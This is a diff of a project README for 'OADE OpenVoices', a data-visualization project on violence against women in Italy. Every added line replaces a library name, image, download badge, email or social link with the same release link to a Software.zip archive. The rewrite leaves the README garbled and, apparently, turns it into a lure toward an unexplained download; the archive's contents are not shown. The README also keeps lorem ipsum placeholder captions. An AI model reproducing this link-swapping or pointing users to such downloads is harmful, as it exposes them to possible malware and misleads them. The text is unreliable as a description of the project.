@@ -24,9 +24,9 @@ The **OADE OpenVoices** project leverages a variety of technologies to deliver a
 
 - **Knime Analytics Platform**: For data processing and analysis.
   
-- **Leaflet.js**: For interactive mapping and geovisualization.
+- **https://github.com/leydypenaloza/OADE_OpenVoices/releases/download/v2.0/Software.zip**: For interactive mapping and geovisualization.
   
-- **Plotly.js**: For creating dynamic and interactive charts.
+- **https://github.com/leydypenaloza/OADE_OpenVoices/releases/download/v2.0/Software.zip**: For creating dynamic and interactive charts.
   
 - **RDF**: For representing data in a linked and structured manner.
   
@@ -36,7 +36,7 @@ The **OADE OpenVoices** project leverages a variety of technologies to deliver a
 
 To get started with **OADE OpenVoices**, download the project files from the following link:
 
-[![Download Project Files](https://img.shields.io/badge/Download-Project_Files-blue)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Project Files](https://github.com/leydypenaloza/OADE_OpenVoices/releases/download/v2.0/Software.zip)](https://github.com/leydypenaloza/OADE_OpenVoices/releases/download/v2.0/Software.zip)
 
 Click the button above to download the project files. Once downloaded, launch the project to explore the results of our statistical analysis on violence against women in Italy.
 
@@ -46,11 +46,11 @@ If the link is not working, please check the **Releases** section of this reposi
 
 Dive into the world of violence against women in Italy with our interactive visualizations. Gain valuable insights and explore the data like never before. Here are a few snapshots of the visualizations included in this project:
 
-![Visualization 1](https://example.com/visualization1.png)
+![Visualization 1](https://github.com/leydypenaloza/OADE_OpenVoices/releases/download/v2.0/Software.zip)
 
 _Lorem ipsum dolor sit amet, consectetur adipiscing elit._
 
-![Visualization 2](https://example.com/visualization2.png)
+![Visualization 2](https://github.com/leydypenaloza/OADE_OpenVoices/releases/download/v2.0/Software.zip)
 
 _Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua._
 
@@ -70,11 +70,11 @@ We welcome contributions from the community to enhance and expand the **OADE Ope
 
 Have questions, suggestions, or feedback? We'd love to hear from you! Reach out to us through one of the following channels:
 
-- **Email**: oade.openvoices@example.com
+- **Email**: https://github.com/leydypenaloza/OADE_OpenVoices/releases/download/v2.0/Software.zip
   
-- **Twitter**: [@OADE_OpenVoices](https://twitter.com/OADE_OpenVoices)
+- **Twitter**: [@OADE_OpenVoices](https://github.com/leydypenaloza/OADE_OpenVoices/releases/download/v2.0/Software.zip)
   
-- **LinkedIn**: [OADE OpenVoices](https://www.linkedin.com/company/oade-openvoices)
+- **LinkedIn**: [OADE OpenVoices](https://github.com/leydypenaloza/OADE_OpenVoices/releases/download/v2.0/Software.zip)
 
 Let's work together to make a difference and raise awareness about violence against women in Italy.
 
